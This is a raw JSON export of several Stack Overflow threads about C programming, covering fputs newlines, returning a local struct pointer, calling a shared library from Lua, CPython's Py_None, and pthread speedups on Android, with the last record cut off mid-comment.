"accept_rate": 80, "profile_image": "https://i.stack.imgur.com/8wevB.png?s=128&g=1", "display_name": "Anonymous Coward", "link": "https://stackoverflow.com/users/956880/anonymous-coward"}, "is_accepted": true, "score": 4, "last_activity_date": 1444821422, "last_edit_date": 1444821422, "creation_date": 1444815584, "answer_id": 33121818, "question_id": 33121509, "link": "https://stackoverflow.com/questions/33121509/when-writing-to-a-file-fputs-does-not-change-line/33121818#33121818", "title": "When writing to a file, fputs() does not change line", "body": "<p>There are two issues in your program :</p>\n\n<ul>\n<li>You should specify \"w\" rather than \"wb\" so that the file is read and written as text rather than binary. Although in some systems this makes no difference and b is ignored.  </li>\n<li>The part for file reading should be in an else, otherwise it executes after file creation with <code>fptr</code> not containing a valid value.</li>\n</ul>\n\n<p>This is the code with those corrections. I do get a multiline data.txt with it.</p>\n\n<pre><code>int main(void){\n\n  char c[1000];\n  FILE *fptr;\n  if ((fptr=fopen(\"data.txt\",\"r\"))==NULL){\n     printf(\"Did not find file, creating new\\n\");\n     fptr = fopen(\"data.txt\", \"w\");\n     fputs(\"//This text file contain information regarding the program 'mon\n     fputs(\"//This text file contain information regarding the program 'mon\n     fputs(\"//Feel free to edit the file as you please.\",fptr);\n     fputs(\"'\\n'\",fptr);\n     fputs(\"(Y) // Y/N - Yes or No, if you want to use this as a database\",\n     fputs(\"sum = 2000 //how much money there is, feel free to edit this nu\n     fclose(fptr);\n  }\n  else\n  {\n    fscanf(fptr,\"%[^\\n]\",c);\n    printf(\"Data from file:\\n%s\",c);\n    fclose(fptr);\n  }\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 89, "user_id": 4478537, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SiWDw.png?s=128&g=1", "display_name": "GeneralDenmark", "link": "https://stackoverflow.com/users/4478537/generaldenmark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1818, "favorite_count": 0, "accepted_answer_id": 33121818, "answer_count": 1, "score": 1, "last_activity_date": 1444821422, "creation_date": 1444814824, "question_id": 33121509, "link": "https://stackoverflow.com/questions/33121509/when-writing-to-a-file-fputs-does-not-change-line", "title": "When writing to a file, fputs() does not change line", "body": "<p>I'm currently trying to create a database in C, using a .txt document as the place to store all the data. But I can't get fputs() to shift line, so everything that my program writes in this .txt document is only on one line.</p>\n\n<pre><code>    int main(void){\n\n   char c[1000];\n   FILE *fptr;\n   if ((fptr=fopen(\"data.txt\",\"r\"))==NULL){\n       printf(\"Did not find file, creating new\\n\");\n       fptr = fopen(\"data.txt\", \"wb\"); \n       fputs(\"//This text file contain information regarding the program 'monies.c'.\\n\",fptr);\n       fputs(\"//This text file contain information regarding the program 'monies.c'.\\n\",fptr);\n       fputs(\"//Feel free to edit the file as you please.\",fptr);\n       fputs(\"'\\n'\",fptr);\n       fputs(\"(Y) // Y/N - Yes or No, if you want to use this as a database\",fptr);\n       fputs(\"sum = 2000 //how much money there is, feel free to edit this number as you please.\",fptr);\n       fclose(fptr);\n\n\n   }\n   fscanf(fptr,\"%[^\\n]\",c);\n   printf(\"Data from file:\\n%s\",c);\n\n   fclose(fptr);\n   return 0;\n}\n</code></pre>\n\n<p>This is my testing document.\nI feel like I've tried everything and then some, but can't get it to change line, help is much appreciated.\nBtw. The output looks like this:\n<a href=\"https://i.stack.imgur.com/aipxo.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/aipxo.png\" alt=\"Output from the program.\"></a> </p>\n"}, {"tags": ["c", "arrays", "string", "garbage", "null-terminated"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1444815040, "post_id": 33121447, "comment_id": 54056114, "body": "<code>return p;</code> return local variable address(<code>&amp;puz</code>). This is not valid outside the scope."}, {"owner": {"reputation": 41, "user_id": 5444335, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10208208927367611/picture?type=large", "display_name": "Paul Myers", "link": "https://stackoverflow.com/users/5444335/paul-myers"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1444914151, "post_id": 33121447, "comment_id": 54107841, "body": "would allocating memory with malloc allow it to work?"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1444914680, "post_id": 33121447, "comment_id": 54108235, "body": "try it. At least the problem is reduced by one in it."}], "answers": [{"tags": [], "owner": {"reputation": 3002, "user_id": 4228131, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RyKUe.jpg?s=128&g=1", "display_name": "WedaPashi", "link": "https://stackoverflow.com/users/4228131/wedapashi"}, "is_accepted": false, "score": 1, "last_activity_date": 1492416772, "last_edit_date": 1492416772, "creation_date": 1444815375, "answer_id": 33121727, "question_id": 33121447, "link": "https://stackoverflow.com/questions/33121447/printing-strings-produces-garbage-even-when-i-think-they-are-null-terminated/33121727#33121727", "title": "printing strings produces garbage even when (I think) they are null terminated", "body": "<p>In function <code>create_puzzle()</code>, you are returning a pointer of the type <code>puzzle_t</code>. But, the address of variable <code>puz</code> of the type <code>puzzle_t</code> is invalid once you return from the function.</p>\n\n<p>Variables that are declared inside a function are local variables. They can be used only by statements that are <em>inside</em> that function. These Local variables are not known to functions outside their own, so returning an address of a local variable doesn't make sense as when the function returns, the local storage it was using on the stack is considered invalid by the program, though it may not get cleared right away. Logically, the value at <code>puz</code> is indeterminate, and accessing it results in undefined behavior.</p>\n\n<p>You can make <code>puz</code> a global variable, and use it the way you are doing right now.</p>\n"}, {"tags": [], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "is_accepted": false, "score": 0, "last_activity_date": 1444815453, "creation_date": 1444815453, "answer_id": 33121759, "question_id": 33121447, "link": "https://stackoverflow.com/questions/33121447/printing-strings-produces-garbage-even-when-i-think-they-are-null-terminated/33121759#33121759", "title": "printing strings produces garbage even when (I think) they are null terminated", "body": "<p>You are returning a local variable here:</p>\n\n<pre><code>return p;\n</code></pre>\n\n<p>Declare <code>p</code> and <code>puz</code> outside of the function, then it should work.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1444822358, "creation_date": 1444822358, "answer_id": 33124199, "question_id": 33121447, "link": "https://stackoverflow.com/questions/33121447/printing-strings-produces-garbage-even-when-i-think-they-are-null-terminated/33124199#33124199", "title": "printing strings produces garbage even when (I think) they are null terminated", "body": "<p><code>p</code> point to local memory that is unavailable after the function ends.  Returning that leads to problems.  Instead allocate memory.</p>\n\n<pre><code>// puzzle_t puz;\n// puzzle_t *p = &amp;puz;\npuzzle_t *p = malloc(sizeof *p);\nassert(p);\n</code></pre>\n\n<p>Be sure to <code>free()</code> the memory after the calling code completes using it.</p>\n"}, {"tags": [], "owner": {"reputation": 174, "user_id": 5428327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9e25d9a07d05da5c2b2542d36bb2c65?s=128&d=identicon&r=PG&f=1", "display_name": "Jack47", "link": "https://stackoverflow.com/users/5428327/jack47"}, "is_accepted": false, "score": 1, "last_activity_date": 1444836936, "last_edit_date": 1495541392, "creation_date": 1444836936, "answer_id": 33129670, "question_id": 33121447, "link": "https://stackoverflow.com/questions/33121447/printing-strings-produces-garbage-even-when-i-think-they-are-null-terminated/33129670#33129670", "title": "printing strings produces garbage even when (I think) they are null terminated", "body": "<p>In short:\n In function <code>create_puzzle()</code>, you are returning a pointer to the local variable <code>puz</code>. Local variables are only known to function inside their own. So the content referenced by the pointer returned by create_puzzle is indeterminate.</p>\n\n<p>More details:\n In C++, local variables are usually generated as storage on a \"stack\" data structure.  when <code>create_puzzle()</code> method is entered, its local variables come alive. A function's local variables will be dead when the method is over. An implementation of C++ is not required to leave the garbage you left on the stack untouched so that you can access it's original content. C++ is not a safe language, implementations let you make mistake and get away with it. Other memory-safe languages solve this problem by restricting your power. For example in C# you can take the address of a local, but the language is cleverly designed so that it is impossible to use it after the lifetime of the local ends.</p>\n\n<p>This answer is very awesome:\n<a href=\"https://stackoverflow.com/questions/6441218/can-a-local-variables-memory-be-accessed-outside-its-scope/6445794#6445794\">Can a local variable&#39;s memory be accessed outside its scope?</a></p>\n"}], "owner": {"reputation": 41, "user_id": 5444335, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10208208927367611/picture?type=large", "display_name": "Paul Myers", "link": "https://stackoverflow.com/users/5444335/paul-myers"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 621, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1492416772, "creation_date": 1444814627, "last_edit_date": 1444815644, "question_id": 33121447, "link": "https://stackoverflow.com/questions/33121447/printing-strings-produces-garbage-even-when-i-think-they-are-null-terminated", "title": "printing strings produces garbage even when (I think) they are null terminated", "body": "<p>When I run <code>print_puzzle(create_puzzle(input))</code>, I get a bunch of gobbledegook at the bottom of the output, only in the last row. I have no idea why this keeps happening. The output is supposed to be 9 rows of 9 numbers (the input is a sudoku puzzle with zeroes representing empty spaces). </p>\n\n<p>This bunch of code should take that input, make a 2d array of strings and then, with print_puzzle, print those strings out in a grid. They are string because eventually I will implement a way to display all the values the square could possibly be. But for now, when I print it out, things are screwed up. I even tried putting the null value in every single element of all 81 strings but it still get's screwed up when it goes to print the strings. I'm lost!</p>\n\n<pre><code>typedef struct square {\n  char vals[10]; // string of possible values\n} square_t;\n\ntypedef struct puzzle {\n  square_t squares[9][9];\n} puzzle_t;\n\nstatic puzzle_t *create_puzzle(unsigned char vals[9][9]) {\n  puzzle_t puz;\n  puzzle_t *p = &amp;puz;\n  int i, j, k, valnum;\n  for (i = 0; i &lt; 9; i++) {\n    for (j = 0; j &lt; 9; j++) {\n      puz.squares[i][j].vals[0] = '\\0';\n      puz.squares[i][j].vals[1] = '\\0';\n      puz.squares[i][j].vals[2] = '\\0';\n      puz.squares[i][j].vals[3] = '\\0';\n      puz.squares[i][j].vals[4] = '\\0';\n      puz.squares[i][j].vals[5] = '\\0';\n      puz.squares[i][j].vals[6] = '\\0';\n      puz.squares[i][j].vals[7] = '\\0';\n      puz.squares[i][j].vals[8] = '\\0';\n      puz.squares[i][j].vals[9] = '\\0';\n      valnum = vals[i][j] -'0';\n      for (k = 0; k &lt; 10; k++){\n        if ((char)(k + '0') == (char)(valnum + '0')){\n          char tmpStr[2] = {(char)(valnum +'0'),'\\0'};\n          strcat(puz.squares[i][j].vals, tmpStr);\n        }\n      }\n    }\n  }\n  return p;\n}\n\nvoid print_puzzle(puzzle_t *p) {\n  int i, j;\n  for (i=0; i&lt;9; i++) {\n    for (j=0; j&lt;9; j++) {\n      printf(\" %2s\", p-&gt;squares[i][j].vals);\n    }\n    printf(\"\\n\");\n  }\n}\n</code></pre>\n"}, {"tags": ["c", "lua"], "comments": [{"owner": {"reputation": 20428, "user_id": 1847592, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/OvYt2.png?s=128&g=1", "display_name": "Egor Skriptunoff", "link": "https://stackoverflow.com/users/1847592/egor-skriptunoff"}, "edited": false, "score": 0, "creation_date": 1444815327, "post_id": 33121355, "comment_id": 54056310, "body": "Use <code>package.loadlib</code>"}, {"owner": {"reputation": 13936, "user_id": 3598119, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/6c9c7dfa28a57e8011d12208a7c86d20?s=128&d=identicon&r=PG", "display_name": "Chris Beck", "link": "https://stackoverflow.com/users/3598119/chris-beck"}, "edited": false, "score": 1, "creation_date": 1445831779, "post_id": 33121355, "comment_id": 54472954, "body": "That&#39;s now how lua modules work. You need to (1) not make a <code>int main()</code> function (2) make a <code>luaopen_X</code> function with an appropriate signature, so that lua can find it. Read the docs."}], "owner": {"user_type": "does_not_exist", "display_name": "user5078020"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 155, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1444814325, "creation_date": 1444814325, "question_id": 33121355, "link": "https://stackoverflow.com/questions/33121355/i-have-a-so-file-and-i-want-to-call-a-function-within-the-so-file-from-lua", "title": "i have a so file and i want to call a function within the so file from lua", "body": "<p>I have a simple c file as below which I have compiled and converted into an so file and transported the .so file into another directory. </p>\n\n<pre><code>test.c\n\n#include&lt;stdio.h&gt;\nvoid disp()\n{\n  printf(\"This is comming from .so file\");\n}\nint main()\n{\n  disp();\n  return 0;\n}\n</code></pre>\n\n<p>To compile gcc -shared -o libtest.so -fPIC test.c</p>\n\n<p>Now I have a lua file . I want to access the disp() function.how should i do that?i tried the following way but did not work. any suggestions??thanks</p>\n\n<pre><code>test.lua\n\ntest={}\nfunction test.init()\nreturn disp()\nend\n\nreturn test\n</code></pre>\n\n<p>now when i do a require i get the following error</p>\n\n<pre><code> Lua 5.2.4  Copyright (C) 1994-2015 Lua.org, PUC-Rio\n    require \"test\"\n    test.init()\n    ./test.lua:4: attempt to call global 'disp' (a nil value)\n    stack traceback:\n        ./test.lua:4: in function 'init'\n        stdin:1: in main chunk\n        [C]: in ?\n</code></pre>\n"}, {"tags": ["python", "c", "cpython"], "comments": [{"owner": {"reputation": 21133, "user_id": 1084416, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/RLhZZ.jpg?s=128&g=1", "display_name": "Peter Wood", "link": "https://stackoverflow.com/users/1084416/peter-wood"}, "edited": false, "score": 1, "creation_date": 1444813833, "post_id": 33121048, "comment_id": 54055305, "body": "<code>Py_None</code> <i>is</i> the value."}, {"owner": {"reputation": 15290, "user_id": 1913824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7793dc1a1117c0583651f716630e2403?s=128&d=identicon&r=PG", "display_name": "Andrea Corbellini", "link": "https://stackoverflow.com/users/1913824/andrea-corbellini"}, "edited": false, "score": 0, "creation_date": 1444825961, "post_id": 33121048, "comment_id": 54063147, "body": "<code>Py_None</code> is a pointer. You can get the memory address it points to using <code>id(None)</code>"}, {"owner": {"reputation": 118092, "user_id": 4952130, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kKQZw.png?s=128&g=1", "display_name": "Dimitris Fasarakis Hilliard", "link": "https://stackoverflow.com/users/4952130/dimitris-fasarakis-hilliard"}, "edited": false, "score": 0, "creation_date": 1444904701, "post_id": 33121048, "comment_id": 54101546, "body": "So for <code>Py_None</code> it&#39;s <code>value == identity</code> ?"}], "answers": [{"comments": [{"owner": {"reputation": 118092, "user_id": 4952130, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kKQZw.png?s=128&g=1", "display_name": "Dimitris Fasarakis Hilliard", "link": "https://stackoverflow.com/users/4952130/dimitris-fasarakis-hilliard"}, "edited": false, "score": 0, "creation_date": 1444814071, "post_id": 33121189, "comment_id": 54055471, "body": "I&#39;m still not getting this.  <code>Py_None</code> is <code>Py_None</code> is equally as confusing as what I&#39;m trying to ask. From what I understand, <code>Py_None</code> must be a <code>c</code> level struct, or a similar <code>c</code> value. What is the <code>c</code> value of <code>Py_None</code> would probably be a better question."}], "tags": [], "owner": {"reputation": 695058, "user_id": 20862, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2343ae368d3241278581ce6c87f62a25?s=128&d=identicon&r=PG", "display_name": "Ignacio Vazquez-Abrams", "link": "https://stackoverflow.com/users/20862/ignacio-vazquez-abrams"}, "is_accepted": false, "score": 1, "last_activity_date": 1444813901, "creation_date": 1444813901, "answer_id": 33121189, "question_id": 33121048, "link": "https://stackoverflow.com/questions/33121048/value-of-py-none/33121189#33121189", "title": "Value of Py_None", "body": "<p><code>Py_None</code> is <code>Py_None</code>, and must be increfed and returned from a function during normal operation if no other value is to be returned. <code>NULL</code> is only returned if an exception is to be signaled to the VM, with the actual exception object <a href=\"https://docs.python.org/2/c-api/exceptions.html\" rel=\"nofollow\">created/assigned separately</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 130643, "user_id": 3923281, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNpoa.jpg?s=128&g=1", "display_name": "Alex Riley", "link": "https://stackoverflow.com/users/3923281/alex-riley"}, "edited": false, "score": 1, "creation_date": 1444817378, "post_id": 33121484, "comment_id": 54057657, "body": "With regard to your final sentence, I think the reason that no new instances of the <code>NoneType</code> type can be created (and the error is raised instead) is because a <code>tp_new</code> space in the type struct has been intentionally left out. The error is raised in <a href=\"https://github.com/python/cpython/blob/0d2e50ea6ac5fa6e7df32dbd4bbbf6da5bcdfdc4/Objects/typeobject.c#l890\" rel=\"nofollow noreferrer\">this function</a>"}, {"owner": {"reputation": 1179, "user_id": 2668109, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27e8ea5636b21d064702dec4b39d9932?s=128&d=identicon&r=PG&f=1", "display_name": "gbs", "link": "https://stackoverflow.com/users/2668109/gbs"}, "reply_to_user": {"reputation": 130643, "user_id": 3923281, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNpoa.jpg?s=128&g=1", "display_name": "Alex Riley", "link": "https://stackoverflow.com/users/3923281/alex-riley"}, "edited": false, "score": 0, "creation_date": 1444817947, "post_id": 33121484, "comment_id": 54058063, "body": "That&#39;s what I figured, @ajcr although it seems to be actually non-NULL (<a href=\"https://github.com/python/cpython/blob/HEAD/Objects/object.c#L1466\" rel=\"nofollow noreferrer\">here</a>). It must be set to NULL at some point because there doesn&#39;t seem to be another way for this error to be raised."}], "tags": [], "owner": {"reputation": 1179, "user_id": 2668109, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27e8ea5636b21d064702dec4b39d9932?s=128&d=identicon&r=PG&f=1", "display_name": "gbs", "link": "https://stackoverflow.com/users/2668109/gbs"}, "is_accepted": true, "score": 5, "last_activity_date": 1444827598, "last_edit_date": 1444827598, "creation_date": 1444814745, "answer_id": 33121484, "question_id": 33121048, "link": "https://stackoverflow.com/questions/33121048/value-of-py-none/33121484#33121484", "title": "Value of Py_None", "body": "<p><code>Py_None</code> is a macro definition in <code>Include/object.h</code>. It is a an alias for <code>_Py_NoneStruct</code> in <code>object.c</code> which is a static (as in storage) global variable of <code>PyObject</code> type (which is a struct). It is assigned in Python terms to be of <code>NoneType</code> (defined right above it in <code>object.c</code> and only used once for <code>_Py_NoneStruct</code>).</p>\n\n<p>So it's not NULL or any other special value in C, it's a singleton <code>PyObject</code> instance of <code>_PyNone_Type</code>. As for the <code>_PyNone_Type</code> <code>PyTypeObject</code> not being exposed, I suppose they refer to the <code>static</code> keyword (i.e. internal linkage) which means that the <code>PyTypeObject</code> is only accessible within <code>object.c</code> and is only used once for the definition of <code>PyNone</code>.</p>\n\n<p>Just to add to this a bit, whenever the documentation says that <code>PyNone</code> has no type, it should not be taken literally. It has a special kind of type, <code>NoneType</code>, which you can still access through the <code>None</code> singleton but you can't create new instances or do any other thing you can do with a normal type. There seems to be a hard-coded limitation for not creating new instances, and although I can't find exactly where it's defined in the CPython source you can see its effect when trying to create a new instance:</p>\n\n<pre><code>&gt;&gt;&gt; type(None)\n&lt;type 'NoneType'&gt;\n&gt;&gt;&gt; type(None)()\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: cannot create 'NoneType' instances\n</code></pre>\n\n<p>EDIT: It seems that the error is thrown from <code>typeobject.c</code> when the <code>tp_new</code> field is NULL. Surprisingly though <code>_PyNone_Type</code> seems to be defined with a non-NULL <code>tp_new</code> (points to the static <code>none_new</code> in <code>object.c</code>). It might be set to NULL afterwards at some point, but it's just an implementation detail and doesn't really make a difference for the scope of your question.</p>\n"}, {"tags": [], "owner": {"reputation": 21133, "user_id": 1084416, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/RLhZZ.jpg?s=128&g=1", "display_name": "Peter Wood", "link": "https://stackoverflow.com/users/1084416/peter-wood"}, "is_accepted": false, "score": 1, "last_activity_date": 1444814760, "creation_date": 1444814760, "answer_id": 33121487, "question_id": 33121048, "link": "https://stackoverflow.com/questions/33121048/value-of-py-none/33121487#33121487", "title": "Value of Py_None", "body": "<p><code>Py_None</code> is the value of the address of the <code>_Py_NoneStruct</code> struct definition.</p>\n\n<p>See <a href=\"https://hg.python.org/releasing/2.7.9/file/753a8f457ddc/Include/object.h#l841\" rel=\"nofollow\">the code</a>:</p>\n\n<pre><code>/*\n_Py_NoneStruct is an object of undefined type which can be used in contexts\nwhere NULL (nil) is not suitable (since NULL often means 'error').\n\nDon't forget to apply Py_INCREF() when returning this value!!!\n*/\nPyAPI_DATA(PyObject) _Py_NoneStruct; /* Don't use this directly */\n#define Py_None (&amp;_Py_NoneStruct)\n</code></pre>\n"}], "owner": {"reputation": 118092, "user_id": 4952130, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kKQZw.png?s=128&g=1", "display_name": "Dimitris Fasarakis Hilliard", "link": "https://stackoverflow.com/users/4952130/dimitris-fasarakis-hilliard"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1219, "favorite_count": 0, "accepted_answer_id": 33121484, "answer_count": 3, "score": 5, "last_activity_date": 1444904675, "creation_date": 1444813475, "last_edit_date": 1491982281, "question_id": 33121048, "link": "https://stackoverflow.com/questions/33121048/value-of-py-none", "title": "Value of Py_None", "body": "<p>It is clear to me that <code>None</code> is used to signify the lack of a value. But since everything must have an underlying value during implementation, I'm looking to see what value has been used in order to signify the absence of a value, regarding <code>CPython</code>.</p>\n\n<p>I understand, based on the <a href=\"https://docs.python.org/3/c-api/none.html#c.Py_None\" rel=\"nofollow noreferrer\">documentation</a>, that <code>NoneObject</code> is a singleton. Since my <code>c</code> skills are rusty, my best, amateur guess, would be that the value of <code>None</code> would be the pointer to the memory allocated for the <code>Py_None</code> object; since it is a singleton this would guarantee uniqueness. Or is it assigned to <code>c</code>'s <code>NULL</code> which has a value of <code>0x0000</code> based on the second answer in <a href=\"https://softwareengineering.stackexchange.com/questions/147713/where-are-null-values-stored-or-are-they-stored-at-all\">this question</a>?</p>\n\n<p>Additionally, the documentation also points out:</p>\n\n<blockquote>\n  <p>Note that the PyTypeObject for None is not directly exposed in the Python/C API.</p>\n</blockquote>\n\n<p>Which I'm guessing means you cannot find it searching through source. (Which I did, not knowing where to look, for <a href=\"https://hg.python.org/cpython/file/c6880edaf6f3/Objects/object.c\" rel=\"nofollow noreferrer\"><code>object.c</code></a> naively believing I could understand anything) </p>\n\n<p>But I'm not certain about my opinion on this so I asked.</p>\n\n<p>What is the <code>c</code> level value for the <code>Py_None</code> object in <code>CPython</code>?</p>\n"}, {"tags": ["android", "c", "multithreading", "android-ndk", "java-native-interface"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1444815588, "post_id": 33121016, "comment_id": 54056486, "body": "Are you running the different Android versions on <i>exactly</i> the same hardware?"}, {"owner": {"reputation": 1, "user_id": 5444296, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7cb512680c15143610e0f755899aa8a6?s=128&d=identicon&r=PG&f=1", "display_name": "Nan Liu", "link": "https://stackoverflow.com/users/5444296/nan-liu"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1444872981, "post_id": 33121016, "comment_id": 54088004, "body": "Thanks for your response.Yes, we run the same code on the same hardware but with only different Android OS vesion. The result is same.In 4.4, we got 3.3 times acceleration but it is failed in 5.0"}, {"owner": {"reputation": 48475, "user_id": 294248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b5dbf3643399236154fbf7f94c20367?s=128&d=identicon&r=PG&f=1", "display_name": "fadden", "link": "https://stackoverflow.com/users/294248/fadden"}, "edited": false, "score": 0, "creation_date": 1444923578, "post_id": 33121016, "comment_id": 54114967, "body": "You may want to run an experiment with systrace. You can find the experiment I performed back on Android 4.3 here: <a href=\"http://bigflake.com/systrace/\" rel=\"nofollow noreferrer\">bigflake.com/systrace</a>"}, {"owner": {"reputation": 1, "user_id": 5444296, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7cb512680c15143610e0f755899aa8a6?s=128&d=identicon&r=PG&f=1", "display_name": "Nan Liu", "link": "https://stackoverflow.com/users/5444296/nan-liu"}, "edited": false, "score": 0, "creation_date": 1444957687, "post_id": 33121016, "comment_id": 54130843, "body": "Thanks for your response. The systrace is performed by Dalvik VM. But in Android 5.0, the Dalvik VM is substituted by ART. Can the systrace be run in Android 5.0?"}], "owner": {"reputation": 1, "user_id": 5444296, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7cb512680c15143610e0f755899aa8a6?s=128&d=identicon&r=PG&f=1", "display_name": "Nan Liu", "link": "https://stackoverflow.com/users/5444296/nan-liu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 116, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1444813825, "creation_date": 1444813381, "last_edit_date": 1444813825, "question_id": 33121016, "link": "https://stackoverflow.com/questions/33121016/the-efficiency-of-multiple-threads-acceleration-is-quite-different-in-android-4", "title": "The efficiency of multiple threads acceleration is quite different in Android 4.4 and 5.0", "body": "<p>I wrote a fragment of C code to do some image processing (intensive computation) in Android (compiled by NDK and utilized by the jni.h). To accelerate the image processing, I used pthread_create and pthread_join functions in the C code to utilize 4 threads to process the image simultaneously.  The multiple threads acceleration is successful in the Android 4.4 mobile phones but failed in all Android 5.0 mobile phones. \nSuppose that the processing time of image_processing function in a single thread environment is 1s. We utilized 4 threads to accelerate the image_processing function like that:</p>\n\n<pre><code>void image_processing_multiply_threads()\n{\n    int i;\n    pthread_t pt[4];\n    for(i = 0 ; i &lt; 4; i++)\n    {\n       if ( pthread_create(pt + i , NULL, image_processing, (void *)(arg + i)) != 0 )\n       {\n         return;\n       }\n    }\n    for (i = 0; i &lt; 4; i++)\n    {\n       pthread_join(pt[i], NULL);\n    }\n}\n</code></pre>\n\n<p>In Android 4.4, the processing time of each thread is about 300ms, so the total time of image_processing_multiply_threads is 300ms, in other words, we got 3.3 times acceleration.\nBut we utilize the same code in the Android 5.0, the processing time of each thread became 1.1s, that means multiple threads version didn\u2019t affect even worse than the one thread version. In Android 5.0, we check the status of each thread. Every thread was successfully created by the pthread_create and the stack size of each thread is same as the size in 4.4. \nWe also tested the two mobile phones with same hardware but different OS version, in 4.4 version, the multiple threads code was successful, but in 5.0 failed.\nWhat is the problem in Android 5.0? How can we solve this problem? Thank you!</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1444812455, "post_id": 33120579, "comment_id": 54054325, "body": "You already tried something?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1444812461, "post_id": 33120579, "comment_id": 54054332, "body": "Please don&#39;t post images of text, and especially not <i>links</i> to images of text. First of all, links can go stale, making your question worthless. Secondly, it&#39;s hard to copy text from an image. And thirdly, not all can actually read text in images (think of people with eye-problems using screen-readers). Instead <i>copy and paste</i> the text into the body of the question."}, {"owner": {"reputation": 47, "user_id": 5075259, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_0YAKJux23M/AAAAAAAAAAI/AAAAAAAADWM/Q2jp3Y7AKDI/photo.jpg?sz=128", "display_name": "Andrej Lavrin\u010d&#237;k", "link": "https://stackoverflow.com/users/5075259/andrej-lavrin%c4%8d%c3%adk"}, "edited": false, "score": 0, "creation_date": 1444812527, "post_id": 33120579, "comment_id": 54054380, "body": "I&#180;ve edited my post, but don&#39;t know how to insert space (i++) on every new line."}, 